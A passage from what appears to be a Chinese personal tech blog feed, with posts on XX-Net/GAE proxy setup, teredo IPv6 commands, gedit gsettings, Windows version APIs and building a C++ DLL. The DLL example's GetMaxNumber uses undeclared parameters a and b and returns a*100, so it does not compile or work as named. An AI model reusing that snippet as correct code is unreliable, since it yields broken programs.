<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">linux-vdso.so.1 (0x00007ffc71f8d000)</span><br><span class="line">libSDL2-2.0.so.0 =&gt; /usr/local/lib/libSDL2-2.0.so.0 (0x00007f07ed821000)</span><br><span class="line">libdl.so.2 =&gt; /lib/x86_64-linux-gnu/libdl.so.2 (0x00007f07ed5f2000)</span><br><span class="line">libpthread.so.0 =&gt; /lib/x86_64-linux-gnu/libpthread.so.0 (0x00007f07ed3d4000)</span><br><span class="line">librt.so.1 =&gt; /lib/x86_64-linux-gnu/librt.so.1 (0x00007f07ed1cc000)</span><br><span class="line">libmad.so.0 =&gt; /usr/lib/x86_64-linux-gnu/libmad.so.0 (0x00007f07ecfac000)</span><br><span class="line">libm.so.6 =&gt; /lib/x86_64-linux-gnu/libm.so.6 (0x00007f07ecc99000)</span><br><span class="line">libc.so.6 =&gt; /lib/x86_64-linux-gnu/libc.so.6 (0x00007f07ec8f4000)</span><br><span class="line">/lib64/ld-linux-x86-64.so.2 (0x0000557697c43000)</span><br></pre></td></tr></table></figure>

<p>这样就OK了 :)</p>
]]></content>
      <categories>
        <category>Programming</category>
      </categories>
      <tags>
        <tag>C++</tag>
        <tag>Linux</tag>
        <tag>C</tag>
        <tag>SDL2</tag>
      </tags>
  </entry>
  <entry>
    <title>XX-NET搭建FQ环境</title>
    <url>/linux-xxnet/</url>
    <content><![CDATA[<p>我是在Linux下搭建的,不过其他系统也是一样的.<br>由于搭建FQ过程比较复杂的,所以这里列举几个工具:<br><a href="#googlechrome">下载Google chrome</a><br><a href="#lantern">使用lantern蓝灯</a><br><a href="#gae">创建GAE并申请appid</a><br><a href="#xx_net">XX-NET配置</a></p>
<a id="more"></a>

<p><font color="green">PS： 以下方法可能比较旧，目前我使用的是X-Tunnel</font></p>
<h3 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h3><table>
<thead>
<tr>
<th>需要</th>
<th>作用</th>
</tr>
</thead>
<tbody><tr>
<td>Chrome浏览器</td>
<td>–</td>
</tr>
<tr>
<td>lantern</td>
<td>访问Google</td>
</tr>
<tr>
<td>XX-NET</td>
<td>主要工具</td>
</tr>
<tr>
<td>GAE</td>
<td>代理服务器</td>
</tr>
<tr>
<td>SwitchOmega</td>
<td>管理和切换多个代理设置</td>
</tr>
</tbody></table>
<h4 id="下载Google-chrome"><a href="#下载Google-chrome" class="headerlink" title="下载Google chrome"></a>下载Google chrome</h4><p>建议去官网下载,所以这里就要用到lantern了<br><img src="/uploads/images/vpn/file_003.png" alt="img"><br>安装略 :)</p>
<h4 id="使用lantern蓝灯"><a href="#使用lantern蓝灯" class="headerlink" title="使用lantern蓝灯"></a>使用lantern蓝灯</h4><p>使用lantern蓝灯</p>
<p>到github获取 <a href="https://github.com/getlantern/forum" target="_blank" rel="noopener">https://github.com/getlantern/forum</a></p>
<p><img src="/uploads/images/vpn/file_001.png" alt="img"><br>我的是Linux系统<br><img src="/uploads/images/vpn/file_002.png" alt="img"><br>下载之后就可以 <code>dpkg -i</code>来安装了,然后可以直接 lantern 运行,并显示一个托盘图标.<br>可以 <code>netstat -ntlp |grep lantern</code> 来查看lantern进场监听的端口.</p>
<blockquote>
<p>别说这访问速度还挺快的.不过,体验版lantern用户每个月只能用几百MB的流量,超过后就不能用了(省点用啊),所以,特么的看个视频就没了…基于此,我决定折腾一番…</p>
</blockquote>
<h4 id="创建GAE并申请appid"><a href="#创建GAE并申请appid" class="headerlink" title="创建GAE并申请appid"></a>创建GAE并申请appid</h4><p>其实,到了这里就是注意了,这才是最主要的.<br>GAE(Google APP Engine)是什么?<br>以下摘自百度</p>
<blockquote>
<p>Google App Engine 是一种让您可以在 Google 的基础架构上运行您的网络应用程序。Google App Engine 应用程序易于构建和维护，并可根据您的访问量和数据存储需要的增长轻松扩展。使用 Google App Engine，将不再需要维护服务器：您只需上传您的应用程序，它便可立即为您的用户提供服务。</p>
</blockquote>
<p><strong>PS:必须去创建一个Google账号,此处不在赘述</strong><br>gae官网: <a href="https://appengine.google.com" target="_blank" rel="noopener">https://appengine.google.com</a><br>输入Google账号密码之后就可以进去gae管理界面了<br><img src="/uploads/images/vpn/file_004.png" alt="img"></p>
<p>之后可以直接创建项目了,注意那个<code>appid</code>就是<strong>项目名</strong><br><img src="/uploads/images/vpn/file_005.png" alt="img"></p>
<p>等待创建完成<br><img src="/uploads/images/vpn/file_006.png" alt="img"></p>
<p>完成之后只需吧那个<code>appid</code>记住.<br><img src="/uploads/images/vpn/file_007.png" alt="img"></p>
<p><strong>PS:可以创建多个项目.在配置xx-net时也可以指定多个appid,一个appid对应1G的使用流量</strong></p>
<h4 id="XX-NET配置"><a href="#XX-NET配置" class="headerlink" title="XX-NET配置"></a>XX-NET配置</h4><p>可以在 <a href="https://github.com/XX-net/XX-Net" target="_blank" rel="noopener">https://github.com/XX-net/XX-Net</a> 下载 <strong>XX-NET</strong><br>直接 <code>git clone https://github.com/XX-net/XX-Net.git</code><br><img src="/uploads/images/vpn/file_008.png" alt="img"></p>
<p>或者在这里下载: <a href="https://github.com/XX-net/XX-Net/blob/master/code/default/download.md" target="_blank" rel="noopener">https://github.com/XX-net/XX-Net/blob/master/code/default/download.md</a><br><img src="/uploads/images/vpn/file_009.png" alt="img"><br>中文帮助文档: <a href="https://github.com/XX-net/XX-Net/wiki/中文文档" target="_blank" rel="noopener">https://github.com/XX-net/XX-Net/wiki/%E4%B8%AD%E6%96%87%E6%96%87%E6%A1%A3</a></p>
<p>下载之后</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">unzip XX-Net-3.8.0.zip</span><br><span class="line">cd XX-Net-3.8.0</span><br><span class="line">./start #后台运行</span><br></pre></td></tr></table></figure>

<p><strong>PS:建议在配置XX-NET之前,后台运行lantern,因为等下部署时要登录Google账号</strong></p>
<p>我在Linux下配置时还要开启<strong>ipv6</strong>通道 .方法如下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">apt-get install miredo</span><br><span class="line">miredo #运行</span><br><span class="line">ifconfig可以看到多出一个`teredo`接口</span><br><span class="line"></span><br><span class="line">teredo: flags=4305 mtu 1280</span><br><span class="line">inet6 2001:0:53aa:64c:2c46:bf0:e4db:1ac5 prefixlen 32 scopeid 0x0</span><br><span class="line">inet6 fe80::707:2c4a:7df6:4104 prefixlen 64 scopeid 0x20</span><br><span class="line">inet6 fe80::ffff:ffff:ffff prefixlen 64 scopeid 0x20</span><br><span class="line">unspec 00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00 txqueuelen 500 (UNSPEC)</span><br><span class="line">RX packets 2828 bytes 1820077 (1.7 MiB)</span><br><span class="line">RX errors 0 dropped 0 overruns 0 frame 0</span><br><span class="line">TX packets 3687 bytes 397036 (387.7 KiB)</span><br><span class="line">TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0</span><br></pre></td></tr></table></figure>

<p>XX-NET主界面<br><img src="/uploads/images/vpn/file_010.png" alt="img"></p>
<p>部署服务端–&gt;配置–&gt;查看状态</p>
<ul>
<li>部署服务端<br>多个appid用 “|” 分割,之后可以[开始部署],再次强调一下,那个<code>appid</code>就是<strong>项目名</strong><br><img src="/uploads/images/vpn/file_011.png" alt="img"></li>
</ul>
<p>之后会跳转到登录Google账号的窗口.登录ok后<strong>等待部署完成</strong></p>
<ul>
<li>配置<br>之后在<code>GAE AppID</code>输入自己的appid<br><img src="/uploads/images/vpn/file_012.png" alt="img"></li>
<li>状态<br>确保每次配置时查看是否配置成功!<br><img src="/uploads/images/vpn/file_013.png" alt="img"><br>如果出现 <code>请检查浏览器代理设置。</code>表示配置成功了,只是还需要 <strong>“设置代理，是为了让你的浏览器或者其他应用程序知道XX-Net的存在，这样他们才会通过XX-Net科学上网。”</strong></li>
<li>解决方法<br>具体方法可以查看 <a href="https://github.com/XX-net/XX-Net/wiki/设置代理" target="_blank" rel="noopener">https://github.com/XX-net/XX-Net/wiki/%E8%AE%BE%E7%BD%AE%E4%BB%A3%E7%90%86</a></li>
</ul>
<p>由于我目前是Linux系统,所以 我用 <strong>Chrome+SwitchOmega(管理和切换多个代理设置)</strong></p>
<p>可以在chrome浏览器应用商店安装SwitchOmega拓展程序<br><img src="/uploads/images/vpn/file_014.png" alt="img"></p>
<p>然后打开<strong>SwitchOmega选项</strong>–&gt;导入/导出–&gt;从备份文件恢复<br>导入<strong>OmegaOptions.bak</strong>文件,此文件位置在 …/XX-Net-3.8.0/SwitchyOmega/ 目录下<br><img src="/uploads/images/vpn/file_015.png" alt="img"></p>
<p>之后可以看到一下几个选项<br><img src="/uploads/images/vpn/file_016.png" alt="img"></p>
<p>然后选择gae服务器代理.恢复正常可以切换回 <strong>[系统代理]</strong><br><img src="/uploads/images/vpn/file_017.png" alt="img"></p>
<p>然后再看看XX-NET配置状态,成功!<br><img src="/uploads/images/vpn/file_018.png" alt="img"><br>现在可以关闭lantern了,然后再去试试看能不能打开 <a href="https://www.google.com" target="_blank" rel="noopener">https://www.google.com</a> 吧!<br><img src="/uploads/images/vpn/file_019.png" alt="img"><br><img src="/uploads/images/vpn/file_020.png" alt="img"></p>
<p>去浪吧~ :&gt;</p>
]]></content>
      <categories>
        <category>Others</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>Google</tag>
      </tags>
  </entry>
  <entry>
    <title>Windows XX-NET使用</title>
    <url>/windows-xxnet/</url>
    <content><![CDATA[<p>本章讲述Windows下怎么快速的搭建FQ环境,同样是用XX-NET<br>同样的,还是到github获取xx-net.<br>本文的重点是在Windows上开始 <strong>IPv6</strong> .<br>在未开启ipv6首次打开xx-net时,会显示 <strong>尚未建立连接</strong>.</p>
<a id="more"></a>

<p><font color="green">PS： 以下方法可能比较旧，目前我使用的是X-Tunnel</font></p>
<h4 id="开启ipv6"><a href="#开启ipv6" class="headerlink" title="开启ipv6"></a>开启ipv6</h4><p>直接在 <strong>cmd命令提示符</strong> 下输入一下命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">//teredo服务器：teredo-debian.remlab.net</span><br><span class="line">netsh interface teredo set state server=teredo-debian.remlab.net</span><br><span class="line">netsh int ter set state enterpriseclient</span><br><span class="line">netsh int ipv6 show teredo	//查看状态</span><br></pre></td></tr></table></figure>

<blockquote>
<p>Teredo 参数<br>-——————————————–<br>类型 : enterpriseclient<br>服务器名称 : teredo-debian.remlab.net<br>客户端刷新间隔 : 30 秒<br>客户端端口 : unspecified<br>状态 : qualified<br>客户端类型 : teredo client<br>网络 : unmanaged<br>NAT : restricted<br>NAT 特殊行为 : UPNP: 是，PortPreserving: 否<br>本地映射 : 192.168.1.103:64530<br>外部 NAT 映射 : xxx.xxx.xxx.xxx:23441</p>
</blockquote>
<p><img src="/uploads/images/win_vpn/file_013.png" alt="img"></p>
<h4 id="恢复teredo"><a href="#恢复teredo" class="headerlink" title="恢复teredo"></a>恢复teredo</h4><p>断开连接的话,可以直接 <strong>退出</strong> xx-net,还需在cmd下输入一下命令即可</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">//恢复teredo</span><br><span class="line">netsh interface teredo set state default server=default</span><br><span class="line">netsh int ipv6 show teredo //查看状态</span><br></pre></td></tr></table></figure>

<blockquote>
<p>Teredo 参数<br>-—————————————–<br>类型 : client<br>服务器名称 : teredo.ipv6.micr<br>客户端刷新间隔 : 30 秒<br>客户端端口 : unspecified<br>状态 : offline<br>错误 : 未能解析服务器名</p>
</blockquote>
<h4 id="IE浏览器代理设置"><a href="#IE浏览器代理设置" class="headerlink" title="IE浏览器代理设置"></a>IE浏览器代理设置</h4><p><img src="/uploads/images/win_vpn/file_017.png" alt="img"></p>
<p>默认情况下,IE浏览器时没有设置代理,所以也就无法访问一些网站.这里介绍两种方法</p>
<h5 id="Internet选项-LAN-设置"><a href="#Internet选项-LAN-设置" class="headerlink" title="Internet选项(LAN)设置"></a>Internet选项(LAN)设置</h5><p>打开IE浏览器&gt;&gt;Internet选项&gt;&gt;连接&gt;&gt;<strong>局域网(LAN)设置</strong>,之后 勾选 代理服务器之一,并填入 <strong>地址</strong> 和 <strong>端口</strong> ,其中地址默认 <code>127.0.0.1</code> ,端口可以从 GAEProxy状态信息 &gt;&gt; 配置 属性里的 <strong>监听代理</strong> 为 <code>8087</code></p>
<p><img src="/uploads/images/win_vpn/file_015.png" alt="img"><br><img src="/uploads/images/win_vpn/file_016.png" alt="img"></p>
<h5 id="花刺代理-ProxyThorn"><a href="#花刺代理-ProxyThorn" class="headerlink" title="花刺代理(ProxyThorn)"></a>花刺代理(ProxyThorn)</h5><p>添加代理<br><img src="/uploads/images/win_vpn/file_018.png" alt="img"></p>
<p>填入gae的服务器地址以及端口<br><img src="/uploads/images/win_vpn/file_019.png" alt="img"></p>
<p>先验证再设为IE代理<br><img src="/uploads/images/win_vpn/file_020.png" alt="img"></p>
<p>然后在次刷新IE浏览器即可再次看到Google主页!</p>
<p>bye</p>
]]></content>
      <categories>
        <category>Others</category>
      </categories>
      <tags>
        <tag>Google</tag>
        <tag>Windows</tag>
      </tags>
  </entry>
  <entry>
    <title>Gnome gedit配置</title>
    <url>/linux-gnome-setting/</url>
    <content><![CDATA[<p>不知什么原因,gedit找不到首选项,所以也无法直接修改配置,经一番琢磨,记录下过程…</p>
<a id="more"></a>

<h4 id="gsettings"><a href="#gsettings" class="headerlink" title="gsettings"></a>gsettings</h4><p>本文用到此工具,用它来查询,修改 <strong>Gnome桌面环境配置</strong> ,关于它的用法可以直接查看帮助文档<br>比如 <code>gsettings list-recursively</code> 就会输出很多信息</p>
<blockquote>
<p>……<br>org.gnome.gnome-system-monitor.proctree col-20-visible false<br>org.gnome.gnome-system-monitor.proctree col-10-visible false<br>org.gnome.gnome-system-monitor.proctree col-6-width 90<br>org.gnome.gnome-system-monitor.proctree col-22-visible true<br>org.gnome.gnome-system-monitor.proctree col-14-visible false<br>org.gnome.gnome-system-monitor.proctree col-13-visible false<br>org.gnome.gnome-system-monitor.proctree col-11-visible false<br>org.gnome.gnome-system-monitor.proctree col-7-width 90<br>org.gnome.gnome-system-monitor.proctree col-16-visible false<br>org.gnome.gnome-system-monitor.proctree col-15-visible true<br>org.gnome.gnome-system-monitor.proctree col-10-width 70<br>org.gnome.gnome-system-monitor.proctree col-8-width 71<br>org.gnome.gnome-system-monitor.proctree col-18-visible false<br>org.gnome.GWeather distance-unit ‘km’<br>……</p>
</blockquote>
<p>获取关于 <strong>gedit</strong> 的配置信息 <code>gsettings list-recursively |grep org.gnome.gedit.preferences.editor</code> 就会输出很多 键值对 .</p>
<h5 id="显示行号"><a href="#显示行号" class="headerlink" title="显示行号"></a>显示行号</h5><blockquote>
<p>gsettings set org.gnome.gedit.preferences.editor display-line-numbers true</p>
</blockquote>
<h5 id="高亮当前行"><a href="#高亮当前行" class="headerlink" title="高亮当前行"></a>高亮当前行</h5><blockquote>
<p>gsettings set org.gnome.gedit.preferences.editor highlight-current-line true</p>
</blockquote>
<h5 id="右侧预览"><a href="#右侧预览" class="headerlink" title="右侧预览"></a>右侧预览</h5><blockquote>
<p>gsettings set org.gnome.gedit.preferences.editor display-overview-map true</p>
</blockquote>
<h5 id="修改主题"><a href="#修改主题" class="headerlink" title="修改主题"></a>修改主题</h5><p>其中主题文件为xml格式,位于 <strong>/usr/share/gtksourceview-3.0/styles</strong> ,可以在 <a href="https://github.com/mig/gedit-themes" target="_blank" rel="noopener">https://github.com/mig/gedit-themes</a> 获取额外的主题文件.</p>
<blockquote>
<p>gsettings set org.gnome.gedit.preferences.editor scheme <strong>oblivion</strong></p>
</blockquote>
<p>其中 <strong>oblivion</strong> 为主题文件名(除去后缀.xml)</p>
<h5 id="修改字体"><a href="#修改字体" class="headerlink" title="修改字体"></a>修改字体</h5><p>在修改字体之前一定要把使用默认字体的设为<code>false</code> ! 不然不会生效</p>
<blockquote>
<p>gsettings set org.gnome.gedit.preferences.editor <strong>use-default-font</strong> <strong>false</strong><br>gsettings set org.gnome.gedit.preferences.editor editor-font <strong>“Monospace 11”</strong></p>
</blockquote>
<p><code>Monospace</code>为字体名称 , <code>11</code> 为字体大小,之前要有空格</p>
<h4 id="结尾"><a href="#结尾" class="headerlink" title="结尾"></a>结尾</h4><p>最后,bye……</p>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>GNOME</tag>
      </tags>
  </entry>
  <entry>
    <title>WindowsAPI获取操作系统主次版本号</title>
    <url>/windows-getosversion/</url>
    <content><![CDATA[<p>列举了一些目前所知道的方法来获取Windows操作系统版本号</p>
<a id="more"></a>

<ul>
<li>方法1 <strong>RtlGetNtVersionNumbers</strong></li>
</ul>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//定义函数指针</span></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">void</span><span class="params">(__stdcall*NTPROC)</span><span class="params">(DWORD*, DWORD*, DWORD*)</span></span>;</span><br><span class="line"><span class="comment">//载入模块</span></span><br><span class="line">HMODULE hmod= LoadLibraryA(<span class="string">"ntdll.dll"</span>);</span><br><span class="line"><span class="comment">//获取函数地址</span></span><br><span class="line">NTPROC RtlGetNtVersionNumbers = (NTPROC)GetProcAddress(hmod, <span class="string">"RtlGetNtVersionNumbers"</span>);</span><br><span class="line">	DWORD dwMajor, dwMin, dwOpt;</span><br><span class="line">	RtlGetNtVersionNumbers(&amp;dwMajor, &amp;dwMin, &amp;dwOpt);</span><br><span class="line">	<span class="comment">//卸载模块</span></span><br><span class="line">	FreeLibrary(hmod);</span><br></pre></td></tr></table></figure>

<ul>
<li>方法2 <strong>GetVersion</strong></li>
</ul>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">DWORD dwVersion= GetVersion();</span><br><span class="line"><span class="comment">//低16位</span></span><br><span class="line">WORD lwo = LOWORD(dwVersion);</span><br><span class="line">BYTE minor = HIBYTE(lwo);	<span class="comment">//次版本号</span></span><br><span class="line">BYTE major = LOBYTE(lwo);   <span class="comment">//主版本号</span></span><br><span class="line"><span class="keyword">if</span> (major ==<span class="number">10</span>)  SetWindowText(<span class="string">L"Windows 10"</span>);</span><br><span class="line"><span class="keyword">if</span> (major ==<span class="number">6</span>)  SetWindowText(<span class="string">L"Windows 7"</span>);</span><br></pre></td></tr></table></figure>

<ul>
<li>方法3 <strong>GetVersionEx</strong></li>
</ul>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">GetVersionEx</span><span class="params">(POSVERSIONINFO pVersionInformation)</span></span>;</span><br><span class="line">	 </span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span> </span><br><span class="line">	DWORD dwOSVersionInfoSize;       <span class="comment">//在使用GetVersionEx之前要将此初始化为结构的大小 </span></span><br><span class="line">	DWORD dwMajorVersion;               <span class="comment">//系统主版本号 </span></span><br><span class="line">	DWORD dwMinorVersion;               <span class="comment">//系统次版本号 </span></span><br><span class="line">	DWORD dwBuildNumber;               <span class="comment">//系统构建号 </span></span><br><span class="line">	DWORD dwPlatformId;                  <span class="comment">//系统支持的平台 </span></span><br><span class="line">	TCHAR szCSDVersion[<span class="number">128</span>];          <span class="comment">//系统补丁包的名称 </span></span><br><span class="line">	WORD wServicePackMajor;            <span class="comment">//系统补丁包的主版本 </span></span><br><span class="line">	WORD wServicePackMinor;            <span class="comment">//系统补丁包的次版本 </span></span><br><span class="line">	WORD wSuiteMask;                      <span class="comment">//标识系统上的程序组 </span></span><br><span class="line">	BYTE wProductType;                    <span class="comment">//标识系统类型 </span></span><br><span class="line">	BYTE wReserved;                         <span class="comment">//保留,未使用 </span></span><br><span class="line">&#125;OSVERSIONINFOEX, *POSVERSIONINFOEX;</span><br></pre></td></tr></table></figure>

<p>注意,使用该函数在Windows8和Windows10之间获取的是同一个主次版本号,所以,要在项目添加一个清单文件(manifest)<br><strong>配置属性-&gt;清单工具-&gt;输入和输出-附加清单文件,填写manifest.xml</strong></p>
<p><strong>manifest.xml文件内容</strong></p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">assembly</span> <span class="attr">xmlns</span>=<span class="string">"urn:schemas-microsoft-com:asm.v1"</span> <span class="attr">manifestVersion</span>=<span class="string">"1.0"</span>&gt;</span> </span><br><span class="line">    <span class="tag">&lt;<span class="name">compatibility</span> <span class="attr">xmlns</span>=<span class="string">"urn:schemas-microsoft-com:compatibility.v1"</span>&gt;</span> </span><br><span class="line">        <span class="tag">&lt;<span class="name">application</span>&gt;</span>   </span><br><span class="line">            <span class="comment">&lt;!-- Windows 10 --&gt;</span>   </span><br><span class="line">            <span class="tag">&lt;<span class="name">supportedOS</span> <span class="attr">Id</span>=<span class="string">"&#123;8e0f7a12-bfb3-4fe8-b9a5-48fd50a15a9a&#125;"</span>/&gt;</span>  </span><br><span class="line">            <span class="comment">&lt;!-- Windows 8.1 --&gt;</span>  </span><br><span class="line">            <span class="tag">&lt;<span class="name">supportedOS</span> <span class="attr">Id</span>=<span class="string">"&#123;1f676c76-80e1-4239-95bb-83d0f6d0da78&#125;"</span>/&gt;</span>  </span><br><span class="line">            <span class="comment">&lt;!-- Windows Vista --&gt;</span>  </span><br><span class="line">            <span class="tag">&lt;<span class="name">supportedOS</span> <span class="attr">Id</span>=<span class="string">"&#123;e2011457-1546-43c5-a5fe-008deee3d3f0&#125;"</span>/&gt;</span>   </span><br><span class="line">            <span class="comment">&lt;!-- Windows 7 --&gt;</span>  </span><br><span class="line">            <span class="tag">&lt;<span class="name">supportedOS</span> <span class="attr">Id</span>=<span class="string">"&#123;35138b9a-5d96-4fbd-8e2d-a2440225f93a&#125;"</span>/&gt;</span>  </span><br><span class="line">            <span class="comment">&lt;!-- Windows 8 --&gt;</span>  </span><br><span class="line">            <span class="tag">&lt;<span class="name">supportedOS</span> <span class="attr">Id</span>=<span class="string">"&#123;4a2f28e3-53b9-4441-ba9c-d69d4a4a6e38&#125;"</span>/&gt;</span>  </span><br><span class="line">        <span class="tag">&lt;/<span class="name">application</span>&gt;</span>   </span><br><span class="line">    <span class="tag">&lt;/<span class="name">compatibility</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;/<span class="name">assembly</span>&gt;</span></span><br></pre></td></tr></table></figure>

<ul>
<li>法4 <strong>PsGetVersion,在内核驱动程序中调用该函数</strong></li>
</ul>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function">BOOLEAN <span class="title">PsGetVersion</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">	PULONG MajorVersion OPTIONAL,</span></span></span><br><span class="line"><span class="function"><span class="params">	PULONG MinorVersion OPTIONAL,</span></span></span><br><span class="line"><span class="function"><span class="params">	PULONG BuildNumber OPTIONAL,</span></span></span><br><span class="line"><span class="function"><span class="params">	PUNICODE_STRING CSDVersion OPTIONAL</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br><span class="line">MajorVersion 是主版本号</span><br><span class="line">MinorVersion 是副版本号</span><br><span class="line">BuildNumber 是build版本号，如<span class="number">7600</span>等</span><br><span class="line">CSDVersion 存放着SP1、SP2等信息</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>Programming</category>
      </categories>
      <tags>
        <tag>C++</tag>
        <tag>Windows</tag>
      </tags>
  </entry>
  <entry>
    <title>C++编写动态链接库Dll+调用Dll</title>
    <url>/cpp-call-dll/</url>
    <content><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><blockquote>
<p>动态链接提供了一种方法，使进程可以调用不属于其可执行代码的函数。函数的可执行代码位于一个 DLL 文件中，该 DLL 包含一个或多个已被编译、链接并与使用它们的进程分开存储的函数。DLL 还有助于共享数据和资源。多个应用程序可同时访问内存中单个 DLL 副本的内容。<br>使用动态链接库可以更为容易地将更新应用于各个模块，而不会影响该程序的其他部分。例如，您有一个大型网络游戏，如果把整个数百MB甚至数GB的游戏的代码都放在一个应用程序里，日后的修改工作将会十分费时，而如果把不同功能的代码分别放在数个动态链接库中，您无需重新生成或安装整个程序就可以应用更新</p>
</blockquote>
<a id="more"></a>



<h3 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h3><p>本文就Windows下创建一个dll动态库并调用</p>
<ul>
<li>打开VS2013，新建一个C++工程（不是MFC！），命名为 “mydll”，接着选中 “DLL”，”导出符号”，直接完成</li>
<li>这时，看到的是默认初始化好了的代码，我们把一些不必要的删掉（其实那些是用来参考的，实际编写时删掉也无大碍）。<br>然后在“mydll.h”头文件里添加 下列代码：</li>
</ul>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">extern</span> <span class="string">"C"</span> <span class="function">MYDLL_API  <span class="keyword">int</span>  _stdcall <span class="title">GetMaxNumber</span><span class="params">(<span class="keyword">int</span>, <span class="keyword">int</span>)</span></span>;</span><br><span class="line"><span class="keyword">extern</span> <span class="string">"C"</span> <span class="function">MYDLL_API <span class="keyword">void</span>  _stdcall <span class="title">ShowMsg</span><span class="params">(<span class="keyword">char</span> *, <span class="keyword">char</span>*)</span></span>;</span><br></pre></td></tr></table></figure>

<p>在“mydll.cpp”源文件添加 如下图所示的功能实现代码：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">extern</span> <span class="string">"C"</span> <span class="function">MYDLL_API  <span class="keyword">int</span>  _stdcall <span class="title">GetMaxNumber</span><span class="params">(<span class="keyword">int</span>, <span class="keyword">int</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">return</span> a&gt;b?a*<span class="number">100</span>:b;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">extern</span> <span class="string">"C"</span> <span class="function">MYDLL_API <span class="keyword">void</span>  _stdcall <span class="title">ShowMsg</span><span class="params">(<span class="keyword">char</span> * <span class="built_in">text</span>, <span class="keyword">char</span>* title)</span></span></span><br><span class="line"><span class="function"></span>&#123;	</span><br><span class="line">	MessageBoxA(<span class="literal">NULL</span>,<span class="built_in">text</span>,title,MB_OK);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>OK!现在代码简简单单的写完了，那如何编译成 .dll 文件呢？<br>单击菜单栏 &gt;”生成”&gt;”生成 mydll”，编译成功。（注意，不是 调试下的开始执行…）<br>然后找到工程的目录所在路径，DeBug目录下找到 那个生成的 “mydll.dll”（现在是不是很激动呢 :)</p>
<h3 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h3><ul>
<li>在重新创建一个工程，这次是一个C++下的控制台应用程序来测试编写的dll是否成功运行！！<br>工程名为“test_mydll”</li>
<li>添加一个.cpp源文件，添加如下代码：<br><strong>（注意，要把 mydll.dll 放到 生成的.exe 同一目录下）</strong></li>
</ul>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="comment">//全局...</span></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">int</span><span class="params">(_stdcall *pGetMaxN)</span><span class="params">(<span class="keyword">int</span>, <span class="keyword">int</span>)</span></span>;	<span class="comment">//定义一个函数指针类型</span></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">void</span><span class="params">(_stdcall *pShowMsg)</span><span class="params">(<span class="keyword">char</span> *, <span class="keyword">char</span> *)</span></span>;</span><br><span class="line">main()...</span><br><span class="line"><span class="comment">//动态加载 dll</span></span><br><span class="line">HMODULE hModule = LoadLibrary(<span class="string">L"mydll.dll"</span>);</span><br><span class="line"><span class="keyword">if</span> (!hModule)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">"Error!"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//获取函数 GetMaxNumber 的地址</span></span><br><span class="line">pGetMaxN pgetm = (pGetMaxN)GetProcAddress(hModule, <span class="string">"GetMaxNumber"</span>);</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; pgetm(<span class="number">10</span>, <span class="number">5</span>) &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="comment">//获取函数 ShowMsg 的地址</span></span><br><span class="line">pShowMsg pshowm = (pShowMsg)GetProcAddress(hModule, <span class="string">"ShowMsg"</span>);</span><br><span class="line">pshowm(<span class="string">"内容"</span>, <span class="string">"标题"</span>);</span><br><span class="line"><span class="comment">//释放</span></span><br><span class="line">FreeLibrary(hModule);</span><br></pre></td></tr></table></figure>

<p>这里要提醒一下哦，上面的是动态加载dll的，所以，就也是说，我们一直都没有使用原来的dll工程生成了那个“mydll.lib”的文件！<br>那么现在以静态调用dll 也是可行的，但 要把那个.lib文件和 .h头文件放到 与.cpp 同一个目录下（注意，这个不是.dll文件，所以可以放在 与.cpp同一个目录下！！！！）</p>
<p><img src="/uploads/images/cpp/0.png" alt="img"></p>
<p>然后，可以放心的吧以前动态调用的代码注释掉啦，添加新代码</p>
